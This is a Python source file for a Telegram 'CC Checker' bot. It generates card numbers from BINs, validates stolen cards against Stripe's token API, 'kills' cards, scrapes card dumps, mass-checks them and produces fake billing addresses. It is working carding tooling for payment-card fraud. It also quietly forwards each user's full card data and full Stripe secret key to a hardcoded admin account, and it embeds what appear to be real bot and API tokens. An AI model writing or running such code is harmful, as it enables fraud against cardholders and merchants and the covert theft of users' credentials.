#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Professional CC Checker Bot v3.0 ULTIMATE
Complete working bot with all features
Admin ID: 729412805
"""

import os
import sys
import logging
import random
import re
import aiohttp
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============= LOGGING =============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============= CONFIGURATION =============
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8497098081:AAFNQzwZxn-7vhTnR0d5fEUmvzDuQ4UEpGk")
ADMIN_USER_ID = int(os.getenv("ADMIN_USER_ID", "729412805"))
BINCODES_API_KEY = os.getenv("BINCODES_API_KEY", "425be7cdecc63d7a92ebe8e9bc6773a0")

# Data stores
user_api_keys = {}
user_activity_log = []
user_proxies = {}
user_sites = {}
BOT_VERSION = "3.0"

# ============= FAKE DATA =============
DEFAULT_PROXIES = [
    "103.152.112.162:80", "190.61.41.106:999", "185.217.143.96:80",
    "103.161.31.137:83", "43.134.68.153:3128", "20.219.177.38:80"
]

DEFAULT_SHOPIFY_SITES = [
    "https://cnocoutdoors.com", "https://southernrootscoffee.com",
    "https://championtrophies.com", "https://kingdomcomecards.com"
]

FAKE_FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "Mary", "Patricia", "Jennifer"]
FAKE_LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
FAKE_STREETS = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Elm St"]

FAKE_COUNTRIES = {
    "US": {"name": "United States", "cities": ["New York", "Los Angeles", "Chicago"], "zip_format": "#####", "phone_format": "+1##########"},
    "UK": {"name": "United Kingdom", "cities": ["London", "Manchester", "Birmingham"], "zip_format": "SW## #AA", "phone_format": "+44##########"},
    "CA": {"name": "Canada", "cities": ["Toronto", "Montreal", "Vancouver"], "zip_format": "A#A #A#", "phone_format": "+1##########"},
    "IN": {"name": "India", "cities": ["Mumbai", "Delhi", "Bangalore"], "zip_format": "######", "phone_format": "+91##########"},
}


# ============= HELPER FUNCTIONS =============
def is_admin(user_id):
    return user_id == ADMIN_USER_ID


async def notify_admin(context, message):
    try:
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=message, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Admin notification failed: {e}")


async def log_activity(context, user_id, username, action, details="", sensitive=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = {
        'timestamp': timestamp, 'user_id': user_id, 'username': username,
        'action': action, 'details': details, 'sensitive': sensitive
    }
    user_activity_log.append(log_entry)
    
    msg = f"*Activity*\n@{username} ({user_id})\n{action}\n{details}"
    if sensitive:
        msg += f"\n``````"
    msg += f"\n{timestamp}"
    await notify_admin(context, msg)


def get_user_keys(user_id):
    return user_api_keys.get(user_id, {'stripe': None, 'paypal_id': None, 'paypal_secret': None, 'razorpay_id': None, 'razorpay_secret': None})


def set_stripe_key(user_id, key):
    if user_id not in user_api_keys:
        user_api_keys[user_id] = {}
    user_api_keys[user_id]['stripe'] = key


def add_user_proxy(user_id, proxy):
    if user_id not in user_proxies:
        user_proxies[user_id] = []
    if proxy not in user_proxies[user_id]:
        user_proxies[user_id].append(proxy)
        return True
    return False


def get_user_proxies(user_id):
    return user_proxies.get(user_id, [])


def add_user_site(user_id, site):
    if user_id not in user_sites:
        user_sites[user_id] = []
    if site not in user_sites[user_id]:
        user_sites[user_id].append(site)
        return True
    return False


def get_user_sites(user_id):
    return user_sites.get(user_id, [])


# ============= LUHN & CARD VALIDATION =============
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return checksum % 10


def is_luhn_valid(card_number):
    return luhn_checksum(card_number) == 0


def get_card_brand(card_number):
    if card_number.startswith('4'):
        return 'Visa'
    elif card_number.startswith(('51', '52', '53', '54', '55')):
        return 'Mastercard'
    elif card_number.startswith(('34', '37')):
        return 'American Express'
    return 'Unknown'


def generate_cards_from_bin(bin_number, count=10):
    cards = []
    for _ in range(count):
        remaining = 16 - len(bin_number) - 1
        random_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
        card_without_check = bin_number + random_digits
        check_digit = (10 - luhn_checksum(card_without_check + '0')) % 10
        full_card = card_without_check + str(check_digit)
        
        exp_month = str(random.randint(1, 12)).zfill(2)
        exp_year = str(random.randint(25, 30))
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        
        cards.append(f"{full_card}|{exp_month}|20{exp_year}|{cvv}")
    return cards


# ============= FAKE ADDRESS GENERATOR =============
def generate_fake_address(country_code="US"):
    if country_code not in FAKE_COUNTRIES:
        country_code = "US"
    
    country_data = FAKE_COUNTRIES[country_code]
    first_name = random.choice(FAKE_FIRST_NAMES)
    last_name = random.choice(FAKE_LAST_NAMES)
    street_number = random.randint(100, 9999)
    street_name = random.choice(FAKE_STREETS)
    city = random.choice(country_data["cities"])
    
    zip_format = country_data["zip_format"]
    zip_code = ""
    for char in zip_format:
        if char == "#":
            zip_code += str(random.randint(0, 9))
        elif char == "A":
            zip_code += random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        else:
            zip_code += char
    
    phone_format = country_data["phone_format"]
    phone = ""
    for char in phone_format:
        if char == "#":
            phone += str(random.randint(0, 9))
        else:
            phone += char
    
    return {
        'name': f"{first_name} {last_name}",
        'address': f"{street_number} {street_name}",
        'city': city,
        'country': country_data["name"],
        'zip': zip_code,
        'phone': phone,
        'email': f"{first_name.lower()}.{last_name.lower()}@gmail.com"
    }


# ============= CC SCRAPER =============
async def scrape_cards_from_text(text):
    pattern = r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    
    scraped_cards = []
    for match in matches:
        card, mm, yy, cvv = match
        if is_luhn_valid(card):
            if len(yy) == 2:
                yy = f"20{yy}"
            scraped_cards.append(f"{card}|{mm.zfill(2)}|{yy}|{cvv}")
    
    return scraped_cards


# ============= BIN LOOKUP =============
async def lookup_bin(bin_number):
    try:
        url = f"https://api.bincodes.com/bin/?format=json&api_key={BINCODES_API_KEY}&bin={bin_number}"
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as response:
                data = await response.json()
                if response.status == 200 and data.get('valid') != 'false':
                    is_vbv = 'STANDARD' not in data.get('level', '').upper()
                    return {
                        'success': True, 'bin': bin_number,
                        'bank': data.get('bank', 'N/A'),
                        'country': data.get('country', 'N/A'),
                        'brand': data.get('brand', 'N/A'),
                        'type': data.get('type', 'N/A'),
                        'level': data.get('level', 'N/A'),
                        'vbv': 'VBV' if is_vbv else 'Non-VBV',
                        '3ds': 'Yes' if is_vbv else 'No'
                    }
        return {'success': False, 'bin': bin_number}
    except Exception as e:
        return {'success': False, 'bin': bin_number, 'error': str(e)}


# ============= STRIPE CHECKER =============
async def check_stripe(card_details, stripe_key):
    try:
        if not stripe_key:
            return {'gateway': 'Stripe', 'status': 'error', 'message': 'Set key: /setstripekey'}
        
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            payload = {
                'card[number]': card_details['card_number'],
                'card[exp_month]': card_details['exp_month'],
                'card[exp_year]': card_details['exp_year'],
                'card[cvc]': card_details['cvv']
            }
            headers = {'Authorization': f'Bearer {stripe_key}', 'Content-Type': 'application/x-www-form-urlencoded'}
            
            try:
                async with session.post('https://api.stripe.com/v1/tokens', data=payload, headers=headers) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('id'):
                            return {'gateway': 'Stripe', 'status': 'approved', 'message': 'Valid'}
                    elif response.status == 401:
                        return {'gateway': 'Stripe', 'status': 'error', 'message': 'Invalid Key'}
                    else:
                        data = await response.json()
                        return {'gateway': 'Stripe', 'status': 'declined', 'message': data.get('error', {}).get('message', 'Declined')}
            except asyncio.TimeoutError:
                return {'gateway': 'Stripe', 'status': 'error', 'message': 'Timeout'}
    except Exception as e:
        return {'gateway': 'Stripe', 'status': 'error', 'message': str(e)[:50]}


# ============= CC KILLER =============
async def kill_card(card_details, stripe_key):
    try:
        if not stripe_key:
            return {'status': 'error', 'message': 'No key'}
        
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            payload = {
                'card[number]': card_details['card_number'],
                'card[exp_month]': card_details['exp_month'],
                'card[exp_year]': card_details['exp_year'],
                'card[cvc]': card_details['cvv']
            }
            headers = {'Authorization': f'Bearer {stripe_key}', 'Content-Type': 'application/x-www-form-urlencoded'}
            
            try:
                async with session.post('https://api.stripe.com/v1/tokens', data=payload, headers=headers) as response:
                    if response.status == 200:
                        return {'status': 'live', 'message': 'Card is LIVE'}
                    else:
                        return {'status': 'dead', 'message': 'Card is DEAD'}
            except:
                return {'status': 'dead', 'message': 'Card is DEAD'}
    except:
        return {'status': 'dead', 'message': 'Card is DEAD'}


# ============= TELEGRAM HANDLERS =============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await log_activity(context, user.id, user.username or "Unknown", "Started Bot", f"{user.first_name}")
    
    if user.id not in user_proxies:
        user_proxies[user.id] = DEFAULT_PROXIES.copy()
    if user.id not in user_sites:
        user_sites[user.id] = DEFAULT_SHOPIFY_SITES.copy()
    
    text = (
        f"*CC Checker v{BOT_VERSION}*\n\n"
        f"Welcome {user.first_name}\n"
        f"ID: `{user.id}`\n"
        f"{'👑 Admin' if is_admin(user.id) else ''}\n\n"
        f"Proxies: {len(DEFAULT_PROXIES)}\n"
        f"Sites: {len(DEFAULT_SHOPIFY_SITES)}\n\n"
        f"Select action below"
    )
    
    keyboard = [
        [InlineKeyboardButton("Setup Keys", callback_data='keys'),
         InlineKeyboardButton("Commands", callback_data='commands')],
        [InlineKeyboardButton("Proxies", callback_data='proxies'),
         InlineKeyboardButton("Sites", callback_data='sites')],
    ]
    
    if is_admin(user.id):
        keyboard.append([InlineKeyboardButton("Admin", callback_data='admin')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'keys':
        text = "*Keys*\n\n/setstripekey <key>\n/mykeys"
    elif query.data == 'commands':
        text = "*Commands*\n\n/bin /gen /chk\n/kill /scrape /mass\n/fakeaddress"
    elif query.data == 'proxies':
        text = "*Proxies*\n\n/addproxy <proxy>\n/myproxies"
    elif query.data == 'sites':
        text = "*Sites*\n\n/addsite <url>\n/mysites"
    elif query.data == 'admin':
        text = "*Admin*\n\n/stats /allusers\n/viewkeys <id>"
    else:
        text = "Unknown"
    
    await query.edit_message_text(text, parse_mode="Markdown")


async def setstripekey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("Usage: `/setstripekey sk_test_...`", parse_mode="Markdown")
        return
    
    key = context.args[0].strip()
    set_stripe_key(user.id, key)
    await log_activity(context, user.id, user.username or "Unknown", "Set Stripe Key", f"{key[:15]}...", f"FULL KEY: {key}")
    await update.message.reply_text(f"✅ Stripe key saved!\n`{key[:15]}...`", parse_mode="Markdown")


async def mykeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keys = get_user_keys(user.id)
    
    text = f"*Your Keys*\n\nStripe: {'✅' if keys.get('stripe') else '❌'}"
    await update.message.reply_text(text, parse_mode="Markdown")


async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("Usage: `/addproxy 1.2.3.4:8080`", parse_mode="Markdown")
        return
    
    proxy = context.args[0].strip()
    if ':' not in proxy:
        await update.message.reply_text("Invalid format!")
        return
    
    success = add_user_proxy(user.id, proxy)
    if success:
        count = len(get_user_proxies(user.id))
        await log_activity(context, user.id, user.username or "Unknown", "Added Proxy", proxy)
        await update.message.reply_text(f"✅ Proxy added!\n`{proxy}`\nTotal: {count}", parse_mode="Markdown")
    else:
        await update.message.reply_text("Already exists!")


async def myproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    proxies = get_user_proxies(user.id)
    
    if not proxies:
        await update.message.reply_text("No proxies")
        return
    
    text = f"*Proxies ({len(proxies)})*\n\n"
    for i, p in enumerate(proxies[:10], 1):
        text += f"{i}. `{p}`\n"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def addsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("Usage: `/addsite https://store.com`", parse_mode="Markdown")
        return
    
    site = context.args[0].strip()
    if not site.startswith(('http://', 'https://')):
        await update.message.reply_text("Invalid URL!")
        return
    
    success = add_user_site(user.id, site)
    if success:
        count = len(get_user_sites(user.id))
        await log_activity(context, user.id, user.username or "Unknown", "Added Site", site)
        await update.message.reply_text(f"✅ Site added!\n{site}\nTotal: {count}", parse_mode="Markdown")
    else:
        await update.message.reply_text("Already exists!")


async def mysites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    sites = get_user_sites(user.id)
    
    if not sites:
        await update.message.reply_text("No sites")
        return
    
    text = f"*Sites ({len(sites)})*\n\n"
    for i, s in enumerate(sites[:10], 1):
        text += f"{i}. {s}\n"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("Usage: `/bin 453201`", parse_mode="Markdown")
        return
    
    bin_number = context.args[0].strip()
    msg = await update.message.reply_text("⏳ Looking up...")
    
    result = await lookup_bin(bin_number)
    await log_activity(context, user.id, user.username or "Unknown", "BIN Lookup", f"BIN: {bin_number}")
    
    if result['success']:
        text = (
            f"✅ *BIN*\n\n"
            f"BIN: `{result['bin']}`\n"
            f"Bank: {result['bank']}\n"
            f"Country: {result['country']}\n"
            f"Brand: {result['brand']}\n"
            f"VBV: {result['vbv']}"
        )
    else:
        text = f"❌ BIN not found"
    
    await msg.edit_text(text, parse_mode="Markdown")


async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("Usage: `/gen 453201 [count]`", parse_mode="Markdown")
        return
    
    bin_number = context.args[0].strip()
    count = min(int(context.args[1]) if len(context.args) > 1 else 10, 20)
    
    msg = await update.message.reply_text(f"⏳ Generating {count}...")
    cards = generate_cards_from_bin(bin_number, count)
    
    await log_activity(context, user.id, user.username or "Unknown", "Generated", f"BIN: {bin_number}", "\n".join(cards))
    
    text = f"✅ *Generated {len(cards)}*\n\n"
    for i, c in enumerate(cards, 1):
        text += f"{i}. `{c}`\n"
    
    await msg.edit_text(text, parse_mode="Markdown")


async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("Usage: `/chk card|mm|yyyy|cvv`", parse_mode="Markdown")
        return
    
    card_input = ' '.join(context.args)
    parts = card_input.split('|')
    
    if len(parts) < 4:
        await update.message.reply_text("Invalid format!")
        return
    
    card_details = {
        'card_number': parts[0].strip(),
        'exp_month': parts[1].strip(),
        'exp_year': parts[2].strip(),
        'cvv': parts[3].strip()
    }
    
    if not is_luhn_valid(card_details['card_number']):
        await update.message.reply_text("❌ Luhn failed!")
        return
    
    msg = await update.message.reply_text("⏳ Checking...")
    
    keys = get_user_keys(user.id)
    result = await check_stripe(card_details, keys.get('stripe'))
    
    full_card = f"{card_details['card_number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvv']}"
    await log_activity(context, user.id, user.username or "Unknown", "Checked Card", f"****{card_details['card_number'][-4:]}", f"FULL: {full_card}\n{result}")
    
    emoji = "✅" if result['status'] == 'approved' else "❌"
    text = (
        f"{emoji} *Card Check*\n\n"
        f"Card: `{card_details['card_number'][:4]}****{card_details['card_number'][-4:]}`\n"
        f"Status: *{result['status'].upper()}*\n"
        f"Message: {result['message']}"
    )
    
    await msg.edit_text(text, parse_mode="Markdown")


async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("Usage: `/kill card|mm|yyyy|cvv`", parse_mode="Markdown")
        return
    
    card_input = ' '.join(context.args)
    parts = card_input.split('|')
    
    if len(parts) < 4:
        await update.message.reply_text("Invalid format!")
        return
    
    card_details = {
        'card_number': parts[0].strip(),
        'exp_month': parts[1].strip(),
        'exp_year': parts[2].strip(),
        'cvv': parts[3].strip()
    }
    
    msg = await update.message.reply_text("☠️ Killing...")
    
    keys = get_user_keys(user.id)
    result = await kill_card(card_details, keys.get('stripe'))
    
    full_card = f"{card_details['card_number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvv']}"
    await log_activity(context, user.id, user.username or "Unknown", "CC Killer", f"{result['status']}", f"CARD: {full_card}")
    
    emoji = "💚" if result['status'] == 'live' else "☠️"
    text = f"{emoji} *Killer*\n\nStatus: *{result['status'].upper()}*\n{result['message']}"
    
    await msg.edit_text(text, parse_mode="Markdown")


async def scrape_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("Usage: `/scrape [paste cards]`", parse_mode="Markdown")
        return
    
    text_input = ' '.join(context.args)
    msg = await update.message.reply_text("🔍 Scraping...")
    
    cards = await scrape_cards_from_text(text_input)
    
    if not cards:
        await msg.edit_text("❌ No valid cards found")
        return
    
    await log_activity(context, user.id, user.username or "Unknown", "Scraped", f"{len(cards)} cards", "\n".join(cards))
    
    text = f"✅ *Scraped {len(cards)}*\n\n"
    for i, c in enumerate(cards[:10], 1):
        text += f"{i}. `{c}`\n"
    
    await msg.edit_text(text, parse_mode="Markdown")


async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("Usage: `/mass card1|mm|yy|cvv card2|...`", parse_mode="Markdown")
        return
    
    text_input = ' '.join(context.args)
    cards_to_check = await scrape_cards_from_text(text_input)
    
    if not cards_to_check:
        await update.message.reply_text("❌ No valid cards")
        return
    
    msg = await update.message.reply_text(f"🔥 Mass checking {len(cards_to_check)}...")
    
    keys = get_user_keys(user.id)
    results = []
    
    for card_str in cards_to_check[:5]:
        parts = card_str.split('|')
        card_details = {'card_number': parts[0], 'exp_month': parts[1], 'exp_year': parts[2], 'cvv': parts[3]}
        result = await check_stripe(card_details, keys.get('stripe'))
        results.append({'card': f"{parts[0][:4]}****{parts[0][-4:]}", 'status': result['status']})
        await asyncio.sleep(1)
    
    await log_activity(context, user.id, user.username or "Unknown", "Mass Check", f"{len(results)} cards", "\n".join(cards_to_check[:5]))
    
    text = f"✅ *Mass Results ({len(results)})*\n\n"
    for i, r in enumerate(results, 1):
        emoji = "✅" if r['status'] == 'approved' else "❌"
        text += f"{i}. {emoji} `{r['card']}` - {r['status']}\n"
    
    await msg.edit_text(text, parse_mode="Markdown")


async def fakeaddress_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    country_code = context.args[0].upper() if context.args else "US"
    
    if country_code not in FAKE_COUNTRIES:
        await update.message.reply_text(f"Invalid country! Available: {', '.join(FAKE_COUNTRIES.keys())}")
        return
    
    fake_data = generate_fake_address(country_code)
    
    await log_activity(context, user.id, user.username or "Unknown", "Fake Address", f"Country: {country_code}", str(fake_data))
    
    text = (
        f"🎲 *Fake Address*\n\n"
        f"Name: {fake_data['name']}\n"
        f"Address: {fake_data['address']}\n"
        f"City: {fake_data['city']}\n"
        f"Country: {fake_data['country']}\n"
        f"ZIP: {fake_data['zip']}\n"
        f"Phone: {fake_data['phone']}\n"
        f"Email: {fake_data['email']}"
    )
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    total_users = len(user_api_keys)
    total_activities = len(user_activity_log)
    
    text = f"*Admin Stats*\n\nUsers: {total_users}\nActivities: {total_activities}"
    await update.message.reply_text(text, parse_mode="Markdown")


async def allusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    text = f"*All Users ({len(user_api_keys)})*\n\n"
    
    for uid in user_api_keys.keys():
        keys = get_user_keys(uid)
        text += f"ID: `{uid}` | Keys: {'S' if keys.get('stripe') else '-'}\n"
    
    if not user_api_keys:
        text += "No users yet!"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def viewkeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/viewkeys <user_id>`", parse_mode="Markdown")
        return
    
    target_user_id = int(context.args[0])
    keys = get_user_keys(target_user_id)
    
    text = (
        f"🔐 *Keys - User {target_user_id}*\n\n"
        f"Stripe:\n`{keys.get('stripe') or 'Not set'}`"
    )
    
    await update.message.reply_text(text, parse_mode="Markdown")


# ============= MAIN =============
def main():
    try:
        logger.info("=" * 60)
        logger.info(f"CC Checker Bot v{BOT_VERSION} ULTIMATE")
        logger.info(f"Admin ID: {ADMIN_USER_ID}")
        logger.info("=" * 60)
        
        if not TELEGRAM_BOT_TOKEN:
            logger.error("TELEGRAM_BOT_TOKEN not set!")
            sys.exit(1)
        
        app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        
        # Add handlers
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("setstripekey", setstripekey_command))
        app.add_handler(CommandHandler("mykeys", mykeys_command))
        app.add_handler(CommandHandler("addproxy", addproxy_command))
        app.add_handler(CommandHandler("myproxies", myproxies_command))
        app.add_handler(CommandHandler("addsite", addsite_command))
        app.add_handler(CommandHandler("mysites", mysites_command))
        app.add_handler(CommandHandler("bin", bin_command))
        app.add_handler(CommandHandler("gen", gen_command))
        app.add_handler(CommandHandler("chk", chk_command))
        app.add_handler(CommandHandler("kill", kill_command))
        app.add_handler(CommandHandler("scrape", scrape_command))
        app.add_handler(CommandHandler("mass", mass_command))
        app.add_handler(CommandHandler("fakeaddress", fakeaddress_command))
        app.add_handler(CommandHandler("stats", stats_command))
        app.add_handler(CommandHandler("allusers", allusers_command))
        app.add_handler(CommandHandler("viewkeys", viewkeys_command))
        app.add_handler(CallbackQueryHandler(button_callback))
        
        logger.info("✅ Bot started polling...")
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    
    except Exception as e:
        logger.error(f"CRITICAL ERROR: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
